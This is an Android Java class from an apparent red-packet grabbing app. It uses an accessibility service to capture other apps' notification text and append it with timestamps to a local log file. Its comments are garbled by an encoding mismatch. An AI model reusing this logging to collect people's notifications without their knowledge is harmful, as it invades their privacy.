/**
 * 
 */
package accessibility.app;

import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.app.Notification;
import android.os.Parcelable;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.RemoteViews;
import android.widget.TextView;
import util.ConfigCt;
import util.Funcs;

/**
 * @author ASUS
 *
 */
public class AccessibilitySaveNotification extends BaseAccessibilityJob {
	private static AccessibilitySaveNotification current;
	private String mFilename;
    private AccessibilitySaveNotification() {
    	super(null);
    	
    }
    public static synchronized AccessibilitySaveNotification getInstance() {
        if(current == null) {
            current = new AccessibilitySaveNotification();
        }
        return current;
    }
    @Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart();
		mFilename=getNotificationFileName();
	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
	/*
	 * (ˢ�´�������)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
    	
	}
	 @Override
	public void onReceiveJob(AccessibilityEvent event) {
		 super.onReceiveJob(event);
		 if(!mIsEventWorking)return;
		 if(!mIsTargetPackageName)return;
		 if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED)   
		 {  
			 Parcelable data = event.getParcelableData();  //��ȡParcelable����           
			 if (data instanceof Notification) {//�ж��Ƿ���Notification����    
				 Notification notification = (Notification) data;  
				 String pkg=event.getPackageName().toString();
				 String sTime=Funcs.milliseconds2String( System.currentTimeMillis());
				 String text = String.valueOf(notification.tickerText);
				 String info=sTime+"("+pkg+")\r\n"+text+"\r\n";
				 if(ConfigCt.DEBUG)Log.i(TAG, text);
				 Funcs.saveInfo2File(info,mFilename,true);
				 //AnalyzeView(notification.contentView,pkg);
			 }
		 }
	} 
	/*
		 * ��ȡ֪ͨ�ļ�����
	* */
	private String getNotificationFileName(){
		//if(ConfigCt.LocalPath.equals(""))ConfigCt.getInstance(context).getLocalDir();
		String filename=ConfigCt.LocalPath+ConfigCt.appID+"sbn.log";
		return filename;
	}
	private void AnalyzeView(RemoteViews remoteView, String packName) {  
		try {  
			//��RemoteView apply���ɵ�ǰ���Դ����View 
			ViewGroup rootLayout=null;
			View v1 = remoteView.apply(context, rootLayout);  
			//Ȼ�����ö�ٴ������View������  
			EnumGroupViews(v1);       
			//չʾ����  
			//rootLayout.addView(v1);       
		} catch (Exception e) {  
			e.printStackTrace();  
		}  
	          
	}  
	private void EnumGroupViews(View v1) {  
		if(v1 instanceof ViewGroup){        
			ViewGroup lav = (ViewGroup)v1;  
			int lcCnt = lav.getChildCount();  
			for(int i = 0; i < lcCnt; i++)  
			{  
				View c1 = lav.getChildAt(i);  
				if(c1 instanceof ViewGroup)  
					EnumGroupViews(c1);//�ݹ鴦��GroupView  
				else if(c1 instanceof TextView) {//TestView����������ı�����   
					TextView txt = (TextView)c1;  
					String str = txt.getText().toString().trim();  
					if(str.length() > 0)  
					{  
	                        //�����ӡ�ı�����  
					}  
					Log.i(TAG, "TextView id:"+ txt.getId() + ".text:" + str);  
	                }else  {  
	                	Log.w(TAG,"2 other layout:" + c1.toString());  
	                      
	                }  
	            }  
	        }  
	        else {  
	        	Log.w(TAG,"1 other layout:" + v1.toString());  
	        }  
	    }  
}
